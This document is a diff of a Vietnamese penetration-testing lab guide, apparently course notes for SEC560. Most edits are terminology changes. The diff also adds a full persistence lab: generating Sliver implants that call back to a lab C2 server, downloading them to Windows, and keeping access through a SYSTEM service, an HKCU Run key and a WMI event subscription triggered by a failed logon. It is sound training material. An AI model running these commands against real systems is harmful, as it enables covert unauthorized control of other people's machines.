@@ -916,7 +916,7 @@ Trong bài thực hành này, chúng ta đã thấy một lỗ hổng bảo mậ
 
 Để thiết lập chế độ chơi nhiều người và làm quen với các tính năng của chế độ này.
 
-Để tạo trình lắng nghe và tạo tải trọng để kết nối với trình lắng nghe.
+Để tạo trình lắng nghe và tạo payloads để kết nối với trình lắng nghe.
 
 Để sử dụng một số khả năng của thiết bị cấy ghép Sliver, cụ thể là khả năng thực thi lắp ráp.
 
@@ -2652,13 +2652,13 @@ Mỗi kỹ thuật này đều vô cùng hữu ích cho các chuyên gia kiểm 
 
 ## Mục tiêu
 
-- Hiểu rõ các tùy chọn tải trọng có sẵn với MSFVenom và Metasploit.
+- Hiểu rõ các tùy chọn payloads có sẵn với MSFVenom và Metasploit.
 
 - Thiết lập Metasploit multi/handler để nhận nhiều kết nối.
 
 - Tạo nhiều payload Metasploit/MSFVenom.
 
-- Sử dụng Sliver để tạo tải trọng và thực thi trên một hệ thống từ xa.
+- Sử dụng Sliver để tạo payloads và thực thi trên một hệ thống từ xa.
 
 ## Chuẩn bị thí nghiệm
 
@@ -2751,7 +2751,7 @@ Chúng ta sẽ sử dụng nó `msfvenom` để tạo ra một vài payload (t�
 
 Trước tiên, hãy cùng xem xét các loại dữ liệu có sẵn trong công cụ này.
 
-Trước tiên, hãy cùng xem xét các định dạng đầu ra của dữ liệu tải trọng.
+Trước tiên, hãy cùng xem xét các định dạng đầu ra của dữ liệu payloads.
 
 ![alt text](IMG/LAB2/LAB2.5/image-9.png)
 
@@ -2796,7 +2796,7 @@ Chuyển sang giao diện dòng lệnh Metasploit trên máy ảo Slingshot củ
 
 ![alt text](IMG/LAB2/LAB2.5/image-13.png)
 
-Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy chủ Windows của mình bằng cách sử dụng tải trọng VBS. Trước tiên, chúng ta cần tương tác với phiên này. Trong ví dụ này, ID phiên là 1. ID phiên của bạn có thể khác. Hãy sử dụng số bạn thấy thay vì 1nếu ID phiên của bạn khác.
+Giờ đây bạn đã có một phiên Meterpreter đang chạy trên máy chủ Windows của mình bằng cách sử dụng payloads VBS. Trước tiên, chúng ta cần tương tác với phiên này. Trong ví dụ này, ID phiên là 1. ID phiên của bạn có thể khác. Hãy sử dụng số bạn thấy thay vì 1nếu ID phiên của bạn khác.
 
 ```bash
 sessions -i 1
@@ -3029,7 +3029,7 @@ generate --os windows --arch 64bit --format shared --skip-symbols --http https:/
 
 ![alt text](IMG/LAB2/LAB2.5/image-28.png)
 
-> LƯU Ý: Tên dữ liệu tải trọng của bạn sẽ được tạo ngẫu nhiên và sẽ khác với tên OUTRAGEOUS_OTT.dll bạn thấy ở đây.
+> LƯU Ý: Tên dữ liệu payloads của bạn sẽ được tạo ngẫu nhiên và sẽ khác với tên OUTRAGEOUS_OTT.dll bạn thấy ở đây.
 
 ### 7. Sao chép và thực thi DLL
 
@@ -3415,7 +3415,7 @@ del "C:\Program Files\VideoStream\1337.exe"
 
 Đăng nhập vào máy tính Windows bằng thông tin đăng nhập bên dưới:
 
-- Tên người dùng: `notadmin`.
+- Tên người dùng: `.\notadmin`.
 
 - Mật khẩu: `notadmin`.
 
@@ -3552,9 +3552,304 @@ Chúc mừng! Chúng ta vừa nâng cấp từ người dùng không có quyền
 
 Nếu muốn, bạn có thể đăng xuất khỏi tài khoản hiện tại rồi đăng nhập bằng tài khoản mới `john`, tài khoản này hiện là thành viên của nhóm Quản trị viên cục bộ.
 
+![alt text](IMG/LAB3/LAB3.1/image-9.png)
+
 Khi hoàn thành, hãy đăng xuất khỏi tài khoản người dùng `notadmin` (hoặc `john`) và đăng nhập lại vào tài khoản người dùng `sec560` để chuẩn bị cho bài thực hành tiếp theo. Mật khẩu mặc định cho tài khoản `sec560` là sec560, trừ khi bạn đã thay đổi nó.
 
 ## Phần kết luận
 
 Chúng tôi đã xác định cách phát hiện và khai thác các lỗ hổng leo thang đặc quyền cục bộ bằng cách sử dụng beRoot và PowerUp. Sử dụng các công cụ này, chúng tôi đã có thể leo thang đặc quyền và tạo một người dùng mới trên hệ thống với quyền quản trị.
+
+# Lab 3.3. Persistence (Duy trì truy cập)
+
+## Mục tiêu
+
+- Tạo nhiều loại tệp để lưu trữ lâu dài với Sliver
+
+- Tạo một dịch vụ lưu trữ dữ liệu để tạo phiên Sliver.
+
+- Tạo khóa đăng ký người dùng để lưu trữ dữ liệu.
+
+- Sử dụng bộ lọc WMI để phát hiện các lần đăng nhập không thành công nhằm kích hoạt tính năng lưu trạng thái.
+
+## Thiết lập phòng thí nghiệm
+
+Máy ảo được sử dụng:
+
+- Máy ảo Linux Slingshot.
+
+- Windows 10.
+
+## Hướng dẫn thực hành từng bước
+
+### 1. Thiết lập Sliver để nhận kết nối
+
+Trước tiên, chúng ta cần thiết lập Sliver để nhận kết nối. Khởi chạy Sliver.
+
+```bash
+sudo sliver-server
+```
+
+Thiết lập trình lắng nghe trên cổng `443` bằng cách chạy lệnh `https` để khởi động trình lắng nghe.
+
+```bash
+https
+```
+
+![alt text](IMG/LAB3/LAB3.3/image.png)
+
+### 2. Tạo các gói tin Sliver để duy trì hoạt động.
+
+Hãy cùng xem xét các tùy chọn với `generate`.
+
+```bash
+generate -h
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-1.png)
+
+Lưu ý rằng chúng ta có thể tạo một định dạng `service`. Định dạng này sẽ phản hồi chính xác với bộ điều khiển dịch vụ và sẽ không bị lỗi sau 30 giây. Vấn đề này được thảo luận chi tiết hơn trong mục `560.4`.
+
+Chúng ta hãy tạo hai payload, một cho dịch vụ và một cho tệp thực thi tiêu chuẩn.
+
+```bash
+generate --os windows --arch 64bit --skip-symbols --format service --name service --http https://10.130.10.128
+generate --os windows --arch 64bit --skip-symbols --format exe --name payload --http https://10.130.10.128
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-2.png)
+
+Trong một bài kiểm thử xâm nhập thực tế, chúng ta có thể muốn hạn chế quyền truy cập và ngăn chặn việc thực thi payload sau khi thời gian kiểm thử cho phép kết thúc. Chúng ta có thể sử dụng `-w` hoặc `--limit-datetime`.
+
+Giờ chúng ta đã có các tập tin, chúng ta cần chuẩn bị chuyển chúng sang Windows.
+
+### 3. Chuyển tập tin sang Windows
+
+**Hãy mở một cửa sổ dòng lệnh mới cho bước này.**
+
+Các tệp hiện thuộc sở hữu của rootngười dùng này. Hãy xác nhận điều này bằng cách xem nội dung các tệp.
+
+```bash
+ls -l *.exe
+```
+
+Như bạn thấy ở trên, các tệp có quyền `rwx` truy cập, nhưng chỉ dành cho chủ sở hữu của tệp đó `root`.
+
+Thay đổi quyền sở hữu tệp thực thi (exe) cho người dùng `sec560` và sau đó xác nhận quyền sở hữu các tệp.
+
+```bash
+sudo chown sec560:sec560 *.exe
+ls -l *.exe
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-3.png)
+
+Bây giờ chúng ta cần chạy một máy chủ web để có thể lấy các tập tin trong Windows. Hãy chạy máy chủ web Python.
+
+![alt text](IMG/LAB3/LAB3.3/image-4.png)
+
+Tiếp theo, chúng ta sẽ chuyển sang Windows và tải xuống các tập tin bằng PowerShell. Mở cửa sổ PowerShell và tải các tập tin chứa thông tin cần thiết xuống màn hình Desktop.
+
+```bash
+cd Desktop
+wget http://10.130.10.128:8000/payload.exe -OutFile payload.exe
+wget http://10.130.10.128:8000/service.exe -OutFile service.exe
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-5.png)
+
+Giờ chúng ta đã có các tập tin trên Windows, hãy tạo khả năng lưu trữ dữ liệu đầu tiên bằng cách sử dụng một dịch vụ.
+
+### 4. Service Persistence
+
+Trước tiên, chúng ta sẽ tạo một dịch vụ theo cách thủ công. Lệnh chúng ta sử dụng được giải thích chi tiết hơn trong mục 560.4. Để làm điều này, chúng ta cần quyền quản trị viên trong Windows. Mở liên `Command Prompt - Run as Administratorkết` trên màn hình Desktop của máy ảo Windows 10 như hình bên dưới.
+
+![alt text](IMG/LAB3/LAB3.3/image-6.png)
+
+Chúng ta sẽ thảo luận chi tiết về lệnh sc này trong mục 560.4. Hiện tại, chúng ta chỉ cần sử dụng lệnh như hiện trạng và tạo một dịch vụ có tên là `persist`. Chạy lệnh dưới đây trong cửa sổ nhắc lệnh CMD mà bạn vừa mở.
+
+```bash
+sc create persist binpath= "c:\Users\sec560\Desktop\service.exe" start= auto
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-7.png)
+
+Hãy kiểm tra cơ chế duy trì kết nối. Khởi động lại các máy chủ Windows và bạn sẽ thấy một phiên Sliver mới trên máy ảo Linux Slingshot của mình.
+
+![alt text](IMG/LAB3/LAB3.3/image-8.png)
+
+Tương tác với phiên này bằng cách sử dụng hai ký tự đầu tiên của ID phiên `sessions -i`. Trong ví dụ này, đó là `a1e6a0b5` nên chúng ta sử dụng ID rút gọn là 5c. ID phiên của bạn sẽ khác!
+
+![alt text](IMG/LAB3/LAB3.3/image-10.png)
+
+Hãy xem chúng ta có quyền truy cập ở mức độ nào với `whoami`.
+
+```bash
+whoami
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-11.png)
+
+Như bạn thấy, dịch vụ chạy với quyền SYSTEM, cho phép chúng ta có quyền truy cập cao nhờ cơ chế duy trì quyền này.
+
+Hãy dọn dẹp hệ thống Windows bằng cách tắt và xóa dịch vụ đó.
+
+Mở cửa sổ CMD với quyền quản trị viên trên Windows và tắt tiến trình và dịch vụ bằng các lệnh sau:
+
+```bash
+sc stop persist
+sc delete persist
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-12.png)
+
+### 5. Tính năng duy trì hoạt động của HKCU
+
+Trên máy tính chạy hệ điều hành Windows, hãy mở cửa sổ lệnh CMD thông thường.
+
+![alt text](IMG/LAB3/LAB3.3/image-13.png)
+
+Chạy lệnh `reg` dưới đây để tạo khóa đăng ký cho người dùng hiện tại.
+
+```bash
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG_SZ /F /D "C:\Users\sec560\Desktop\payload.exe"
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-14.png)
+
+Các tùy chọn cho lệnh này là:
+
+- `reg` - lệnh cần chạy.
+
+- `add` - thêm khóa.
+
+- `"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`- Vị trí để thêm khóa
+
+- `/V "User Persist"` - Tên của khóa (Giá trị)
+
+- `/t REG_SZ` - kiểu Chuỗi
+
+- `/F` - Buộc ghi đè nếu tệp đã tồn tại
+
+- `/D "C:\Users\sec560\Desktop\payload.exe"` - dữ liệu, tập tin thực thi để chạy.
+
+Chúng ta có thể sử dụng `HKLM (HKEY Local Machine)` thay thế, và điều này sẽ hoạt động cho bất kỳ người dùng nào đăng nhập vào hệ thống, nhưng nó yêu cầu quyền truy cập nâng cao để sử dụng khóa này. Chúng ta đang sử dụng `HKCU (HKEY Current User)` nên nó không yêu cầu quyền truy cập nâng cao.
+
+Để kiểm tra điều này, chỉ cần đăng xuất khỏi Windows rồi đăng nhập lại với tư cách người dùng `sec560`. Khi đăng nhập lại, bạn sẽ thấy một phiên làm việc mới trong Sliver.
+
+![alt text](IMG/LAB3/LAB3.3/image-15.png)
+
+Tương tác với phiên này bằng cách sử dụng hai ký tự đầu tiên của ID phiên `sessions -i`. Trong ví dụ này, đó là `d725fb0a` nên chúng ta sử dụng ID rút gọn là `d7`. ID phiên của bạn sẽ khác!
+
+```bash
+sessions -i d7
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-16.png)
+
+Chạy lệnh `whoami` để xem quyền truy cập hiện tại.
+
+```bash
+whoami
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-17.png)
+
+Hãy dọn dẹp và xóa khóa này. Mở lại cửa sổ lệnh CMD thông thường và xóa khóa đó.
+
+```bash
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /F
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-18.png)
+
+Các tùy chọn cho lệnh này là:
+
+- `reg` - lệnh cần chạy.
+
+- `delete` - xóa một khóa.
+
+- `"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"` - Vị trí để thêm khóa.
+
+- `/V "User Persist"` - Tên của khóa (Giá trị).
+
+### 6. Tính năng lưu trữ bộ lọc sự kiện WMI
+
+Bộ lọc sự kiện WMI cho phép linh hoạt rất nhiều trong việc kích hoạt payloads của chúng ta. Chúng ta sẽ thiết lập một trình lắng nghe sự kiện cho việc đăng nhập không thành công (ID sự kiện 4625) cho người dùng `fakeuser`. Điều này sẽ cho phép chúng ta kích hoạt payloads của mình khi đăng nhập không thành công đối với một người dùng không tồn tại!
+
+Chúng ta sẽ sử dụng các lệnh PowerShell bên dưới để thiết lập bộ lọc. Bạn cần có quyền quản trị viên trong cửa sổ PowerShell để thiết lập việc này.
+
+![alt text](IMG/LAB3/LAB3.3/image-19.png)
+
+Quá trình thiết lập gồm ba phần.
+
+- Lệnh đầu tiên chúng ta sẽ sử dụng để thiết lập Bộ lọc Sự kiện `-Class __EventFilter` với tên là `UPDATER`. Sau đó, truy vấn sẽ tìm kiếm các lần đăng nhập thất bại (ID Sự kiện 4625) trong đó thông tin đăng nhập khớp với fakeuser.
+
+- Phần thứ hai thiết lập trình xử lý dữ liệu, hay nói cách khác là xử lý khi bộ lọc khớp. Trong trường hợp này, các kết quả khớp với UPDATERbộ lọc sẽ chạy tải trọng của chúng ta nằm tại `C:\Users\sec560\Desktop\payload.exe`.
+
+- Bước cuối cùng thiết lập liên kết để tìm kiếm tác nhân kích hoạt và chạy trình tiêu thụ (payload) của chúng ta.
+
+Các lệnh ở đây khá phức tạp. Vui lòng sao chép và dán các lệnh này vào cửa sổ PowerShell với quyền quản trị viên.
+
+```bash
+$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%fakeuser%'"; QueryLanguage = 'WQL'}
+
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = "UPDATER"; CommandLineTemplate = "C:\Users\sec560\Desktop\payload.exe"}
+
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-20.png)
+
+Bây giờ chúng ta đã thiết lập bộ lọc, hãy chuyển sang Linux, mở một cửa sổ terminal mới và thử đăng nhập bằng `smbclient` tài khoản của chúng ta `fakeuser`. Quá trình này có thể mất một lúc để bộ lọc phát hiện việc đăng nhập. Bạn có thể cần đợi đến một phút.
+
+```bash
+smbclient '\\10.130.10.25\c$' -U fakeuser fakepass
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-21.png)
+
+Sau đó, bạn sẽ thấy một phiên làm việc mới trong Sliver!
+
+![alt text](IMG/LAB3/LAB3.3/image-22.png)
+
+Tương tác với phiên này bằng cách sử dụng hai ký tự đầu tiên của ID phiên `sessions -i`. Trong ví dụ này, đó là `750cb0ba` nên chúng ta sử dụng ID rút gọn là `75`. ID phiên của bạn sẽ khác!
+
+```bash
+sessions -i 75
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-23.png)
+
+Một lần nữa, hãy xem chúng ta đang chạy với tư cách người dùng nào `whoami`.
+
+```bash
+whoami
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-24.png)
+
+Như bạn thấy, điều này cấp quyền truy cập cấp HỆ THỐNG trên Windows. Nếu chúng ta mất quyền truy cập, tất cả những gì chúng ta cần làm là thử đăng nhập lại với tư cách người dùng không tồn tại `fakeuser` để có được một phiên làm việc mới.
+
+Phương pháp chúng tôi sử dụng ở đây là thủ công và khá phức tạp, và điều quan trọng là phải hiểu những nguyên tắc cơ bản về cách thức hoạt động của nó. Tuy nhiên, có những lựa chọn khác để thực hiện việc này dễ dàng hơn:
+
+- Metasploit - sử dụng mô-đun `windows/local/wmi_persistence`.
+
+- Empires - sử dụng mô-đun `persistence/elevated/wmi`.
+
+Hãy xóa bộ lọc này, bộ lọc và trình tiêu thụ bằng cửa sổ PowerShell hiện có mà bạn đang mở.
+
+```bash
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'" | Remove-WmiObject -Verbose
+
+Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "__Path LIKE '%UPDATER%'" | Remove-WmiObject -Verbose
+
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "__Path LIKE '%UPDATER%'" | Remove-WmiObject -Verbose
+```
+
+![alt text](IMG/LAB3/LAB3.3/image-25.png)
+
+## Phần kết luận
+
+Chúng tôi đã sử dụng nhiều phương pháp khác nhau để duy trì quyền truy cập vào hệ thống Windows. Phương pháp bạn sử dụng phụ thuộc vào cấp độ quyền truy cập và cách bạn chọn để ẩn mình. Duy trì quyền truy cập thông qua việc kiên trì là một phần rất quan trọng của kiểm thử xâm nhập. Việc phải nỗ lực rất nhiều để giành được quyền truy cập rồi lại đánh mất nó là điều vô cùng khó chịu đối với bất kỳ người kiểm thử nào!
 
